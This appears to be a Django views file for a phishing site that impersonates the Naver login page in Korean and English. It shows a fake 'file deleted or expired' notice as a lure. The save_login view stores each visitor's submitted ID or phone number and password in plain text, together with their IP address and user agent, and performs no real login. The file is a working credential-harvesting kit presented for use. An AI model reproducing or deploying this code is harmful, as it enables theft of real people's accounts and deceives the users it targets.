import random
from datetime import datetime
from pathlib import Path

from django.conf import settings
from django.http import JsonResponse
from django.shortcuts import render
from django.views.decorators.http import require_POST


def _client_ip(request):
    forwarded = request.META.get('HTTP_X_FORWARDED_FOR')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return (request.META.get('REMOTE_ADDR') or '').strip()


_BANNER_IMAGE_SUFFIXES = {'.jpg', '.jpeg', '.png', '.gif', '.webp'}


def _random_banner_static_relative_path():
    banners_dir = Path(settings.BASE_DIR) / 'static' / 'banners'
    if not banners_dir.is_dir():
        return None
    paths = [
        f'banners/{p.name}'
        for p in banners_dir.iterdir()
        if p.is_file() and p.suffix.lower() in _BANNER_IMAGE_SUFFIXES
    ]
    return random.choice(paths) if paths else None


def _file_error_modal_copy(lang):
    if lang == 'en_US':
        return {
            'error_title': (
                'The requested file has been deleted or does not exist.'
            ),
            'error_sub': (
                'The file has been deleted or has expired. '
                'Please check the content again.'
            ),
            'home_label': 'Go to Home',
        }
    return {
        'error_title': '요청하신 파일이 삭제되었거나 존재하지 않습니다.',
        'error_sub': (
            '파일이 삭제되었거나 만료되었습니다. '
            '내용을 다시 한 번 확인해 주세요.'
        ),
        'home_label': '홈으로 가기',
    }


def login_page(request):
    lang = request.GET.get('lang', 'ko_KR')
    if lang not in {'ko_KR', 'en_US'}:
        lang = 'ko_KR'

    content_template = (
        'accounts/content_en.html' if lang == 'en_US' else 'accounts/content_ko.html'
    )
    html_lang = 'en' if lang == 'en_US' else 'ko'
    page_title = 'Naver Sign in' if lang == 'en_US' else '네이버 : 로그인'

    return render(
        request,
        'accounts/index.html',
        {
            'lang': lang,
            'html_lang': html_lang,
            'content_template': content_template,
            'page_title': page_title,
            'banner_image': _random_banner_static_relative_path(),
            'file_error_modal': _file_error_modal_copy(lang),
        },
    )


@require_POST
def save_login(request):
    uploads_dir = Path(settings.BASE_DIR) / 'uploads'
    uploads_dir.mkdir(parents=True, exist_ok=True)

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
    file_path = uploads_dir / f'{timestamp}.txt'

    id_val = request.POST.get('id', '')
    pw_val = request.POST.get('pw', '')
    ip = _client_ip(request)
    user_agent = (request.META.get('HTTP_USER_AGENT') or '').strip()

    text = (
        f'ID/Phone number: {id_val}\n'
        f'Password: {pw_val}\n'
        f'IP: {ip}\n'
        f'User-Agent: {user_agent}\n'
    )
    file_path.write_text(text, encoding='utf-8')

    return JsonResponse({'ok': True})
